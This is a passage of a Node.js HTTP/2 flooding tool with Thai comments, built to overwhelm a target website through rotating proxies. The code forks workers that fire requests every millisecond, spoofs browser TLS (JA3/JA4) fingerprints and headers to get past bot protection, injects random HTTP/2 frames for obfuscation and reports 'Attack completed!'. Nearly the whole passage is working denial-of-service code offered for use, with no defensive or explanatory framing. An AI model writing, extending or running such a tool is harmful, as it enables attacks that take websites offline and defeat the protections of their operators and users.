    // ใช้ custom proxy เดี่ยว
    proxies = [options.customProxy];
    console.log(`\x1b[36m[INFO]\x1b[0m Using custom proxy: ${options.customProxy}`);
} else if (args.proxyFile && args.proxyFile.toLowerCase() !== 'null') {
    // ใช้ proxy จากไฟล์
    proxies = readLines(args.proxyFile);
} else {
    console.log(`\x1b[31m[ERROR]\x1b[0m No proxy specified. Please use --proxy option or provide a proxy file.`);
    process.exit(1);
}

const parsedTarget = url.parse(args.target);
colors.enable();
if (cluster.isMaster) {
   // Initial console output
   console.clear();
 console.log('Target: '+process.argv[2]);
 console.log('Time: '+process.argv[3]);
 console.log('Rate: '+process.argv[4]);
 console.log('Thread(s): '+process.argv[5]);
 
 // แสดงข้อมูล proxy ที่ใช้
 if (options.customProxy) {
   console.log(`Custom Proxy: ${options.customProxy}`);
 } else {
 console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
 }
 
 // ตรวจสอบและแสดงจำนวน proxy ที่มี authentication
 let authProxies = 0;
 proxies.forEach(proxy => {
   if (proxy.includes('@')) authProxies++;
 });
 if (authProxies > 0) {
   console.log(`Proxy Authentication: ${authProxies}/${proxies.length} proxies using authentication`);
 }
 
 console.log(`BFM (Bypass Cookie): ${options.bfm ? 'Enabled' : 'Disabled'}`);
 console.log(`Auto Cookie Fetch: ${options.cookie ? 'Enabled' : 'Disabled'}`);
 console.log(`Auto Cookie File: ${options.autoCookie ? 'Enabled' : 'Disabled'}`);
 console.log(`Cache Bypass: ${options.cache ? 'Enabled' : 'Disabled'}`);
 console.log(`Debug Mode: ${options.debug ? 'Enabled' : 'Disabled'}`);
 
 // แสดงข้อมูล User-Agent ที่จะใช้
 if (options.userAgent) {
   // Custom User-Agent is set but not logged to avoid spam
 } else {
 console.log(`Fakebot: ${options.fakebot ? 'Enabled' : 'Disabled'}`);
 }
 
 console.log(`Rate Limit Per IP: ${options.ratelimit ? options.ratelimit + ' req/IP' : options.autoratelimit ? 'Auto' : 'Disabled'}`);
 console.log(`Referrer Spoof: ${options.referrer ? 'Enabled' : 'Disabled'}`);
 if (options.manualCookie) {
   console.log(`Manual Cookie: ${options.manualCookie.substring(0, 30)}...`);
 }
   
   // ฟังก์ชันสำหรับ restart script
   const restartScript = () => {
       // ปิด worker processes ทั้งหมด
       for (const id in cluster.workers) {
           cluster.workers[id].kill();
       }

       // เริ่ม worker processes ใหม่ทันทีโดยไม่ต้องรอ
       console.log(`\x1b[33m[SYSTEM]\x1b[0m Restarting workers due to high RAM usage...`);
       for (let counter = 1; counter <= args.threads; counter++) {
           cluster.fork();
       }
   };

   // ฟังก์ชันตรวจสอบการใช้งาน RAM
   const handleRAMUsage = () => {
       const totalRAM = os.totalmem();
       const usedRAM = totalRAM - os.freemem();
       const ramPercentage = (usedRAM / totalRAM) * 100;

       // แสดงข้อมูลการใช้ RAM ทุกๆ 30 วินาที (เฉพาะเมื่อใช้งานมากกว่า 80%)
       const now = Date.now();
       if (!handleRAMUsage.lastLog || now - handleRAMUsage.lastLog > 30000) {
           if (ramPercentage > 80) {
               console.log(`\x1b[36m[INFO]\x1b[0m RAM usage: ${ramPercentage.toFixed(2)}%`);
               handleRAMUsage.lastLog = now;
           }
       }

       if (ramPercentage >= MAX_RAM_PERCENTAGE) {
           console.log(`\x1b[31m[WARNING]\x1b[0m Maximum RAM usage reached: ${ramPercentage.toFixed(2)}%`);
           restartScript();
       }
   };
   
   // ตั้ง interval เพื่อตรวจสอบการใช้งาน RAM ทุก 5 วินาที
   setInterval(handleRAMUsage, 5000);
   
   // Load cookie from file if auto-cookie is enabled
   if (options.autoCookie) {
     // Check if cookie file already exists
     const cookieFromFile = getCookieFromFile(args.target);
     if (cookieFromFile) {
       targetCookies = cookieFromFile;
       console.log(`\x1b[32m[SUCCESS]\x1b[0m Using cookies from file: ${targetCookies.substring(0, 50)}${targetCookies.length > 50 ? '...' : ''}`);
       
       // Start workers with cookies from file
       for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
       }
     } else {
       // If no cookie file exists, run getcookie.js automatically
       console.log(`\x1b[33m[INFO]\x1b[0m No cookie file found for ${args.target}, running getcookie.js...`);
       
       // Run getcookie.js and wait for it to complete
       runGetCookieScript(args.target).then(success => {
         // Try to read the cookie file again after getcookie.js completes
         const newCookieFromFile = getCookieFromFile(args.target);
         if (newCookieFromFile) {
           targetCookies = newCookieFromFile;
           console.log(`\x1b[32m[SUCCESS]\x1b[0m Using cookies from file: ${targetCookies.substring(0, 50)}${targetCookies.length > 50 ? '...' : ''}`);
         } else {
           console.log(`\x1b[33m[WARNING]\x1b[0m Could not get cookies from getcookie.js, starting attack without cookies`);
         }
         
         // Start workers after cookie attempt regardless of success
         for (let counter = 1; counter <= args.threads; counter++) {
           cluster.fork();
         }
       });
     }
   }
   
   // Fetch cookies if enabled and not using auto-cookie
   else if (options.cookie && !options.autoCookie) {
     console.log(`\x1b[33m[INFO]\x1b[0m Fetching cookies from target...`);
     fetchCookiesFromTarget(args.target).then(cookies => {
       targetCookies = cookies;
       if (targetCookies) {
         console.log(`\x1b[32m[SUCCESS]\x1b[0m Cookies fetched: ${targetCookies.substring(0, 50)}${targetCookies.length > 50 ? '...' : ''}`);
       } else {
         console.log(`\x1b[33m[WARNING]\x1b[0m No cookies found or couldn't fetch cookies from target`);
       }
       // Start workers after cookie fetch
       for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
       }
     });
   } else {
     // Start workers without fetching cookies
     console.log(`\x1b[36m[INFO]\x1b[0m Starting attack without cookie fetching...`);
     for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
     }
   }

   // แสดงข้อความและเปลี่ยนแปลงค่า TCP parameters สำหรับประสิทธิภาพสูงสุด
   console.log(`\x1b[33m[SYSTEM]\x1b[0m Optimizing TCP parameters for better performance...`);
   TCP_CHANGES_SERVER();
    
   // Start stats display in master process
   const statsInterval = setInterval(printStats, 1000);
    
   // Set timeout to stop attack
   setTimeout(() => {
     clearInterval(statsInterval);
     printStats(); // Final stats
     console.log("\x1b[32m[SUCCESS]\x1b[0m Attack completed!");
     process.exit(0);
   }, args.time * 1000);
    
   // Handle worker messages
   cluster.on('message', (worker, message) => {
     if (message && message.type === 'status_code' && message.code) {
       if (!stats.statusCodes[message.code]) {
         stats.statusCodes[message.code] = 0;
       }
       stats.statusCodes[message.code]++;
     }
     if (message && message.type === 'error') {
       stats.errors++;
     }
     if (message && message.type === 'retry_after') {
       stats.totalRetryAfters += message.value;
     }
   });
} else {
   // เรียกใช้ runFlooder หลายครั้งเพื่อเพิ่มประสิทธิภาพการ flood
   // เริ่ม flood ทันที
   runFlooder();
   
   // ตั้ง interval สำหรับ flooding หลายๆ ครั้ง
   for (let i = 0; i < 10; i++) { 
     setInterval(runFlooder, 1);
   }
}

function runFlooder() {
    // เพิ่มการนับ request และอัพเดทเวลา request ล่าสุด
    stats.totalRequests++;
    stats.lastRequestTime = Date.now();
    
    // Get the next available proxy that's not rate-limited and not in retry-wait
    const proxyAddr = options.ratelimit ? getNextAvailableProxy() : randomElement(proxies);
    // ใช้ฟังก์ชัน parseProxy เพื่อรองรับทั้ง proxy ปกติและแบบมี authentication
    const parsedProxy = parseProxy(proxyAddr);
    // ใช้ IP address ของ proxy สำหรับการติดตาม rate limit
    const proxyIP = parsedProxy.host;
    
    // Check if this proxy is in retry-wait
    if (isProxyInRetryWait(proxyIP)) {
        // Calculate time remaining in wait period
        const waitTimeRemaining = Math.ceil((proxyStats[proxyIP].retryAfter - Date.now()) / 1000);
        if (waitTimeRemaining > 0) {
            // Skip this proxy and try again later
            return;
        }
    }
    
    // Track request for this proxy
    trackProxyRequest(proxyIP);
    
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    
    // Select random browser for this request
    const browser = getRandomBrowser();
    
    // Generate headers based on browser type
    const headers = generateHeaders(browser, parsedTarget);
    
    // Get browser-specific HTTP/2 settings
    const browserH2Settings = h2Settings(browser);
    
    // Get realistic client hello parameters with JA3/JA4 fingerprints
    const clientHelloData = createRealisticClientHello(browser);
    
    const proxyOptions = {
        host: parsedProxy.host,
        port: parsedProxy.port,
        address: parsedTarget.host + ":443",
        timeout: 10,
        authHeader: parsedProxy.authHeader // เพิ่ม authentication header
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
          stats.errors++; // Track errors locally
          
          // Report error to master process
          if (cluster.isWorker) {
            try {
              process.send({
                type: 'error'
              });
            } catch (e) {
              // Ignore IPC channel closed errors
            }
          }
          return;
        }

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        // Use browser-specific settings with full coverage of HTTP/2 settings
        const settingsObj = {
           // Main HTTP/2 settings from browser profile
           enablePush: (browserH2Settings.SETTINGS_ENABLE_PUSH || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.ENABLE_PUSH]) === 1,
           initialWindowSize: browserH2Settings.SETTINGS_INITIAL_WINDOW_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE],
           headerTableSize: browserH2Settings.SETTINGS_HEADER_TABLE_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
           maxConcurrentStreams: browserH2Settings.SETTINGS_MAX_CONCURRENT_STREAMS || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
           maxHeaderListSize: browserH2Settings.SETTINGS_MAX_HEADER_LIST_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
           maxFrameSize: browserH2Settings.SETTINGS_MAX_FRAME_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_FRAME_SIZE],
           // Additional advanced HTTP/2 settings
           enableConnectProtocol: (browserH2Settings.SETTINGS_ENABLE_CONNECT_PROTOCOL || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]) === 1,
           enableRfc7540Priorities: (browserH2Settings.SETTINGS_NO_RFC7540_PRIORITIES || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]) === 0,
           enableMetadata: (browserH2Settings.SETTINGS_ENABLE_METADATA || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.ENABLE_METADATA]) === 1
        };
        
        // Transform settings to HTTP/2 format with all possible settings
        const settings = transformSettings([
            ["SETTINGS_HEADER_TABLE_SIZE", settingsObj.headerTableSize],
            ["SETTINGS_ENABLE_PUSH", settingsObj.enablePush ? 1 : 0],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", settingsObj.maxConcurrentStreams],
            ["SETTINGS_INITIAL_WINDOW_SIZE", settingsObj.initialWindowSize],
            ["SETTINGS_MAX_FRAME_SIZE", settingsObj.maxFrameSize],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", settingsObj.maxHeaderListSize],
            ["SETTINGS_ENABLE_CONNECT_PROTOCOL", settingsObj.enableConnectProtocol ? 1 : 0],
            ["SETTINGS_NO_RFC7540_PRIORITIES", settingsObj.enableRfc7540Priorities ? 0 : 1],
            ["SETTINGS_ENABLE_METADATA", settingsObj.enableMetadata ? 1 : 0]
        ]);
        
        // สุ่มเลือก TLS version
        const tlsVersion = clientHelloData.tlsVersions;

        const tlsOptions = {
           port: parsedPort,
           secure: true,
           ALPNProtocols: clientHelloData.alpnProtocols,
           ciphers: clientHelloData.ciphers,
           sigalgs: clientHelloData.signatureAlgorithms,
           requestCert: true,
           socket: connection,
           ecdhCurve: clientHelloData.ecdhCurve,
           honorCipherOrder: true,
           host: parsedTarget.host,
           rejectUnauthorized: false,
           secureOptions: secureOptions,
           secureContext: secureContext,
           servername: parsedTarget.host,
           secureProtocol: secureProtocol,
           // Use properties from JA3/JA4 fingerprint
           minVersion: tlsVersion.min,
           maxVersion: tlsVersion.max,
           // Include both JA3 and JA4 fingerprints for better evasion
           ja3: clientHelloData.ja3.ja3,
           ja3String: clientHelloData.ja3.ja3,
           ja3Hash: clientHelloData.ja3.ja3_hash,
           ja4: clientHelloData.ja4.ja4,
           ja4String: clientHelloData.ja4.ja4,
           ja4Hash: clientHelloData.ja4.ja4_hash,
           // Include plugin information in TLS metadata for further authenticity
           pluginsInfo: clientHelloData.plugins,
           appData: clientHelloData.appData,
           // Add session ticket parameters based on plugin count for additional fingerprint variation
           sessionTicket: clientHelloData.plugins.count > 0,
           sessionTimeout: 300 + (clientHelloData.plugins.count * 10)
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 10000);
        tlsConn.setMaxListeners(0);
        
        let hpack = new HPACK();

        // Get HTTP/2 session options based on browser and client hello data
        const http2SessionOptions = createHttp2SessionOptions(browser, clientHelloData);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: settingsObj, // Use object format for initial connect
           createConnection: () => tlsConn,
           socket: connection,
           // Include all client fingerprinting data
           fingerprint: clientHelloData,
           ja3String: clientHelloData.ja3.ja3,
           ja3Hash: clientHelloData.ja3.ja3_hash,
           ja4: clientHelloData.ja4.ja4,
           ja4String: clientHelloData.ja4.ja4,
           ja4Hash: clientHelloData.ja4.ja4_hash,
           // Include plugin information
           plugins: clientHelloData.plugins,
           // Add HTTP/2 specific session options
           ...http2SessionOptions,
           // Add browser-specific priority settings
           defaultPriority: getBrowserPriorityData(browser)
        });

        // Apply transformed settings directly
        const settingsFrame = Object.fromEntries(settings);
        client.settings(settingsFrame);

        client.setMaxListeners(0);

        // เพิ่มการปรับค่าหน้าต่าง HTTP/2 แบบไดนามิก
        const updateWindow = () => {
            // สุ่มขนาดหน้าต่าง HTTP/2 เพื่อให้ดูเป็นธรรมชาติ
            const windowSize = Math.floor(Math.random() * (20000000 - 15000000 + 1)) + 15000000;
            try {
                if (client && !client.destroyed) {
                    // Create a settings update for the window size using official identifiers
                    const dynamicSettings = {};
                    dynamicSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = windowSize;
                    
                    // Create and send a proper HTTP/2 SETTINGS frame
                    const settingsFrame = createSettingsFrame(dynamicSettings);
                    client.socket.write(settingsFrame);
                    
                    // Also create and send a proper WINDOW_UPDATE frame (connection-level)
                    const windowUpdateFrame = createWindowUpdateFrame(0, windowSize);
                    client.socket.write(windowUpdateFrame);
                    
                    // Also set window size using the built-in method as fallback
                    client.setLocalWindowSize(windowSize);
                    
                    // Send window updates for individual streams if any are active
                    if (Math.random() < 0.5) {
                        for (let i = 1; i <= 5; i++) {
                            // Random stream IDs
                            const streamId = Math.floor(Math.random() * 10) + 1;
                            // Random window increment
                            const increment = Math.floor(Math.random() * 15663105) + 15663105;
                            const streamWindowUpdate = createWindowUpdateFrame(streamId, increment);
                            client.socket.write(streamWindowUpdate);
                        }
                    }
                }
            } catch (e) {
                // Ignore errors
            }
        };
        
        // อัพเดทขนาดหน้าต่างทุก 5-10 วินาที
        const updateWindowInterval = setInterval(updateWindow, Math.floor(Math.random() * 5000) + 5000);

        client.on("connect", () => {
            // Add event listener for session headers
            if (clientHelloData.plugins && clientHelloData.plugins.count > 0) {
                // Add plugin-specific TLS extension data when connection is established
                try {
                    // Create custom settings combination for HTTP/2 based on plugin count
                    // This mimics how browsers with plugins configure their HTTP/2 settings
                    const pluginSpecificSettings = {};
                    const pluginCount = clientHelloData.plugins.count;
                    
                    // Only adjust specific settings based on plugins to avoid detection
                    if (Math.random() < 0.5) {
                        pluginSpecificSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = 
                            Math.min(6291456 + (pluginCount * 1000), 8000000);
                    }
                    
                    if (Math.random() < 0.3) {
                        // Add occasional setting updates that plugin-enabled browsers might send
                        const settingsFrame = createSettingsFrame(pluginSpecificSettings);
                        client.socket.write(settingsFrame);
                    }
                } catch (e) {
                    // Ignore errors
                }
            }
            
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    // Generate fresh browser-specific headers for each request
                    const dynamicHeaders = generateHeaders(browser, parsedTarget);
                    
                    // Shuffle headers for better bypass
                    const shuffledHeaders = shuffleObject({
                        ...dynamicHeaders,
                        ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} : {}),
                        ...(Math.random() < 0.5 ? {["X-" + randstr(4)]: generateRandomString(5, 10)} : {}),
                        // เพิ่ม header ที่เป็นเอกลักษณ์สำหรับแต่ละ request
                        ...(Math.random() < 0.2 ? {"X-Request-ID": crypto.randomBytes(16).toString('hex')} : {}),
                        ...(Math.random() < 0.3 ? {"X-Frame-Options": "SAMEORIGIN"} : {})
                    });
                    
                    // กำหนดค่า priority สำหรับ request
                    const priority = getBrowserPriorityData(browser);
                    
                    // Fixed priority for HTTP/2 streams - use browser-specific values
                    const fixedPriority = getBrowserPriorityData(browser);
                    
                    // Occasionally update settings during the attack for added realism
                    if (Math.random() < 0.1) {
                        // Create dynamic settings update using official HTTP/2 settings identifiers
                        const dynamicSettings = {};
                        dynamicSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = Math.floor(Math.random() * 10000000) + 5000000;
                        dynamicSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS] = Math.floor(Math.random() * 1000) + 100;
                        
                        // Create and send a proper HTTP/2 SETTINGS frame
                        const settingsFrame = createSettingsFrame(dynamicSettings);
                        client.socket.write(settingsFrame);
                        
                        // Also send using the built-in method as a fallback
                        client.settings(dynamicSettings);
                    }
                    
                    // Occasionally send a WINDOW_UPDATE frame
                    if (Math.random() < 0.15) {
                        const windowSize = Math.floor(Math.random() * 10000000) + 5000000;
                        const windowUpdateFrame = createWindowUpdateFrame(0, windowSize); // Stream 0 = connection-level
                        client.socket.write(windowUpdateFrame);
                    }
                    
                    // Occasionally send random HTTP/2 frames for obfuscation
                    if (Math.random() < 0.05) {
                        const randomFrame = createRandomFrame();
                        client.socket.write(randomFrame);
                    }
                    
                    // Send a request with browser-specific stream priority
                    const request = client.request(shuffledHeaders, { priority });
                    
                    // Apply browser-specific priority to the stream
                    applyBrowserPriority(request, browser);
                    
                    // Randomly use the dedicated priority frame function
                    if (Math.random() < 0.3) {
                        const streamId = request.id || Math.floor(Math.random() * 1000) + 1;
                        const priorityFrame = createPriorityFrame(streamId, getBrowserPriorityData(browser));
                        client.socket.write(priorityFrame);
                    }
                    
                    // Use HPACK encoding for better header compression and more realistic traffic
                    try {
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(shuffledHeaders)
                        ]);
                        
                        // Create a proper HTTP/2 HEADERS frame with the packed headers
                        const streamId = Math.floor(Math.random() * 1000) + 1;
                        
                        // Determine appropriate flags using the constants
                        const flags = Math.random() < 0.7 ? 
                            HTTP2_FLAGS.END_STREAM | HTTP2_FLAGS.END_HEADERS : 
                            HTTP2_FLAGS.END_HEADERS;
                        
                        // Create a headers frame with priority data
                        if (Math.random() < 0.5) {
                            const headersWithPriority = createHeadersFrameWithPriority(
                                streamId, 
                                shuffledHeaders, 
                                getBrowserPriorityData(browser), 
                                Math.random() < 0.7 // randomize END_STREAM flag
                            );
                            
                            // Send with probability
                            if (Math.random() < 0.7) {
                                client.socket.write(headersWithPriority);
                            }
                        } else {
                            // Use the regular frame creator with flags
                        const headerFrame = createHTTP2Frame(
                            HTTP2_FRAME_TYPES.HEADERS,
                            flags,
                            streamId,
                            packed
                        );
                        
                        // Send with probability
                        if (Math.random() < 0.7) {
                            client.socket.write(headerFrame);
                            }
                        }
                    } catch (e) {
                        // If HPACK encoding fails, continue with normal request
                    }

                    // Add response handler with status code tracking
                    request.on("response", (headers, flags) => {
                        const statusCode = headers[":status"];
                        
                        // Check for retry-after header (case insensitive check)
                        const retryAfterHeader = Object.keys(headers).find(
                            h => h.toLowerCase() === "retry-after"
                        );
                        
                        // Always enforce retry period for 429 responses even if no Retry-After header
                        if (statusCode === 429 || statusCode === "429") {
                            if (retryAfterHeader && headers[retryAfterHeader]) {
                                setProxyRetryAfter(proxyIP, headers[retryAfterHeader]);
                            } else {
                                // If no Retry-After header but got 429, use default minimum wait time
                                setProxyRetryAfter(proxyIP, "5");
                                if (options.debug) {
                                    console.log(`\x1b[36m[DEBUG]\x1b[0m 429 response without Retry-After header, using default wait`);
                                }
                            }
                        } else if (retryAfterHeader && headers[retryAfterHeader]) {
                            // For other status codes, still respect any Retry-After header sent
                            setProxyRetryAfter(proxyIP, headers[retryAfterHeader]);
                        }
                        
                        // Adjust auto rate limit based on response
                        if (options.autoratelimit) {
                            adjustAutoRateLimit(proxyIP, statusCode);
                        }
                        
                        // Track status code in local worker process
                        if (!stats.statusCodes[statusCode]) {
                          stats.statusCodes[statusCode] = 0;
                        }
                        stats.statusCodes[statusCode]++;
                        
                        // Send status code to master process
                        if (cluster.isWorker) {
                          try {
                            process.send({ 
                              type: 'status_code', 
                              code: statusCode 
                            });
                          } catch (e) {
                            // Ignore IPC channel closed errors
                          }
                        }
                        
                        // Debug headers - save successful (200) and blocked (403) requests
                        if (options.debug && (statusCode === '200' || statusCode === '403' || statusCode === 200 || statusCode === 403)) {
                            // Save request headers for debugging
                            saveDebugHeaders(String(statusCode), shuffledHeaders, parsedTarget.href);
                        }
                        
                        // Sometimes send a proper RST_STREAM frame instead of just closing
                        if (Math.random() < 0.3) {
                            const rstStreamPayload = Buffer.alloc(4);
                            // Use an official error code
                            const errorCode = Math.random() < 0.5 ? 
                                HTTP2_ERROR_CODES.CANCEL : 
                                HTTP2_ERROR_CODES.NO_ERROR;
                            
                            rstStreamPayload.writeUInt32BE(errorCode, 0);
                            const rstFrame = createHTTP2Frame(
                                HTTP2_FRAME_TYPES.RST_STREAM,
                                0,
                                request.id,
                                rstStreamPayload
                            );
                            
                            client.socket.write(rstFrame);
                        }
                        
                        request.close();
                        request.destroy();
                        return;
                    });
                    
                    request.end();
                }
            }, 550); 

            // ล้าง interval เมื่อปิดการเชื่อมต่อ
        client.on("close", () => {
                clearInterval(IntervalAttack);
                clearInterval(updateWindowInterval);
                
                // Send a proper GOAWAY frame before destroying the connection
                try {
                    const lastStreamId = Math.floor(Math.random() * 1000);
                    const goawayPayload = Buffer.alloc(8);
                    goawayPayload.writeUInt32BE(lastStreamId, 0);
                    goawayPayload.writeUInt32BE(HTTP2_ERROR_CODES.NO_ERROR, 4);
                    
                    const goawayFrame = createHTTP2Frame(
                        HTTP2_FRAME_TYPES.GOAWAY,
                        0,
                        0, // Stream ID for GOAWAY is always 0
                        goawayPayload
                    );
                    
                    client.socket.write(goawayFrame);
                } catch (e) {
                    // Ignore errors during cleanup
                }
                
            client.destroy();
            connection.destroy();
            return;
            });
        });

        client.on("error", error => {
            clearInterval(updateWindowInterval);
            stats.errors++; // Track errors locally
            
            // Report error to master process
            if (cluster.isWorker) {
              try {
                process.send({
                  type: 'error'
                });
              } catch (e) {
                // Ignore IPC channel closed errors
              }
            }
            
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

// Safe error handling
process.on('uncaughtException', error => {
  stats.errors++;
  // Report error to master process
  if (cluster.isWorker) {
    try {
      process.send({
        type: 'error'
      });
    } catch (e) {
      // Ignore IPC channel closed errors
    }
  }
});
process.on('unhandledRejection', error => {
  stats.errors++;
  // Report error to master process
  if (cluster.isWorker) {
    try {
      process.send({
        type: 'error'
      });
    } catch (e) {
      // Ignore IPC channel closed errors
    }
  }
});

// Add debug log if DEBUG env var is set
if (process.env.DEBUG) {
  console.log(`[DEBUG] Browser configurations loaded: ${browsers.join(", ")}`);
  console.log(`[DEBUG] Proxy count: ${proxies.length}`);
}

//=============================================================================
// HTTP/2 FRAME CREATION FUNCTIONS
//=============================================================================

// Add a new function to create HTTP/2 frame packets
const createHTTP2Frame = (type, flags, streamId, payload) => {
    // Frame format: Length (24 bits) + Type (8 bits) + Flags (8 bits) + Reserved (1 bit) + Stream Identifier (31 bits) + Frame Payload
    const frame = Buffer.alloc(9 + payload.length);
    
    // Length: 24 bits
    frame.writeUInt8((payload.length >> 16) & 0xFF, 0);
    frame.writeUInt8((payload.length >> 8) & 0xFF, 1);
    frame.writeUInt8(payload.length & 0xFF, 2);
    
    // Type: 8 bits
    frame.writeUInt8(type, 3);
    
    // Flags: 8 bits
    frame.writeUInt8(flags, 4);
    
    // Stream Identifier: 31 bits (ignoring reserved bit)
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    
    // Frame Payload
    payload.copy(frame, 9);
    
    return frame;
};

// Function to create a SETTINGS frame
const createSettingsFrame = (settings, flags = 0) => {
    // Calculate payload size: 6 bytes per setting
    const numSettings = Object.keys(settings).length;
    const payload = Buffer.alloc(numSettings * 6);
    
    let offset = 0;
    for (const [id, value] of Object.entries(settings)) {
        // Each setting is a 16-bit identifier and a 32-bit value
        payload.writeUInt16BE(Number(id), offset);
        payload.writeUInt32BE(Number(value), offset + 2);
        offset += 6;
    }
    
    return createHTTP2Frame(HTTP2_FRAME_TYPES.SETTINGS, flags, 0, payload);
};

// Function to create a WINDOW_UPDATE frame
const createWindowUpdateFrame = (streamId, windowSizeIncrement) => {
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(windowSizeIncrement & 0x7FFFFFFF, 0);
    return createHTTP2Frame(HTTP2_FRAME_TYPES.WINDOW_UPDATE, 0, streamId, payload);
};

// Function to create a random HTTP/2 frame for obfuscation
const createRandomFrame = () => {
    const frameTypes = [
        HTTP2_FRAME_TYPES.PING,
        HTTP2_FRAME_TYPES.WINDOW_UPDATE,
        HTTP2_FRAME_TYPES.SETTINGS
    ];
    
    const type = frameTypes[Math.floor(Math.random() * frameTypes.length)];
    let payload;
    let streamId = 0;
    
    switch (type) {
        case HTTP2_FRAME_TYPES.PING:
            payload = crypto.randomBytes(8);
            break;
        case HTTP2_FRAME_TYPES.WINDOW_UPDATE:
            payload = Buffer.alloc(4);
            streamId = Math.floor(Math.random() * 10) + 1;
            payload.writeUInt32BE(Math.floor(Math.random() * 10000000) + 1000000, 0);
            break;
        case HTTP2_FRAME_TYPES.SETTINGS:
            payload = Buffer.alloc(6);
            payload.writeUInt16BE(HTTP2_SETTINGS.INITIAL_WINDOW_SIZE, 0);
            payload.writeUInt32BE(Math.floor(Math.random() * 10000000) + 1000000, 2);
            break;
        default:
            payload = Buffer.alloc(0);
    }
    
    return createHTTP2Frame(type, 0, streamId, payload);
};

// Function to create HTTP/2 priority frame
const createPriorityFrame = (streamId, priorityData) => {
    // Priority frame format: E(1) + Stream Dependency(31) + Weight(8)
    const payload = Buffer.alloc(5);
    
    // E bit (exclusive) + Stream Dependency (31 bits)
    const exclusiveBit = priorityData.exclusive ? 0x80000000 : 0;
    const dependencyWithE = (priorityData.depends_on & 0x7FFFFFFF) | exclusiveBit;
    payload.writeUInt32BE(dependencyWithE, 0);
    
    // Weight (8 bits) - value between 1-256, stored as weight-1
    payload.writeUInt8(priorityData.weight - 1, 4);
    
    return createHTTP2Frame(HTTP2_FRAME_TYPES.PRIORITY, 0, streamId, payload);
};

// Function to create HTTP/2 headers frame with priority
const createHeadersFrameWithPriority = (streamId, headers, priorityData, endStream = true) => {
    // First create HPACK encoded headers
    let hpack = new HPACK();
    const encodedHeaders = hpack.encode(headers);
    
    // Calculate priority data size (5 bytes if priority included)
    const prioritySize = priorityData ? 5 : 0;
    
    // Create payload with space for priority data + headers
    const payload = Buffer.alloc(prioritySize + encodedHeaders.length);
    
    let offset = 0;
    
    // Add priority data if present
    if (priorityData) {
        // E bit (exclusive) + Stream Dependency (31 bits)
        const exclusiveBit = priorityData.exclusive ? 0x80000000 : 0;
        const dependencyWithE = (priorityData.depends_on & 0x7FFFFFFF) | exclusiveBit;
        payload.writeUInt32BE(dependencyWithE, 0);
        
        // Weight (8 bits) - value between 1-256, stored as weight-1
        payload.writeUInt8(priorityData.weight - 1, 4);
        
        offset = 5;
    }
    
    // Copy encoded headers to payload after priority data
    encodedHeaders.copy(payload, offset);
    
    // Calculate flags
    let flags = 0;
    if (endStream) flags |= HTTP2_FLAGS.END_STREAM;
    flags |= HTTP2_FLAGS.END_HEADERS;
    if (priorityData) flags |= HTTP2_FLAGS.PRIORITY;
    
    return createHTTP2Frame(HTTP2_FRAME_TYPES.HEADERS, flags, streamId, payload);
};

// Add config function to include plugin data in HTTP/2 connection
function createHttp2SessionOptions(browser, clientHello) {
    // Get all settings from browser profile and HTTP2_SETTINGS_DEFAULTS
    const browserSettings = h2Settings(browser);
    const defaultSettings = { ...HTTP2_SETTINGS_DEFAULTS };
    
    // Base session options that all browsers support
    const baseSessionOptions = {
        maxSessionMemory: 10000, // Higher memory allowance for modern browsers
        maxDeflateDynamicTableSize: 4294967295,
        maxOutstandingPings: 10,
        maxHeaderPairs: 128,
        maxOutstandingSettings: 1000,
        maxReservedRemoteStreams: 200,
        peerMaxConcurrentStreams: browserSettings.SETTINGS_MAX_CONCURRENT_STREAMS || defaultSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        paddingStrategy: 0,
        maxHeaderListSize: browserSettings.SETTINGS_MAX_HEADER_LIST_SIZE || defaultSettings[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
        maxFrameSize: browserSettings.SETTINGS_MAX_FRAME_SIZE || defaultSettings[HTTP2_SETTINGS.MAX_FRAME_SIZE],
        maxConcurrentStreams: browserSettings.SETTINGS_MAX_CONCURRENT_STREAMS || defaultSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        headerTableSize: browserSettings.SETTINGS_HEADER_TABLE_SIZE || defaultSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
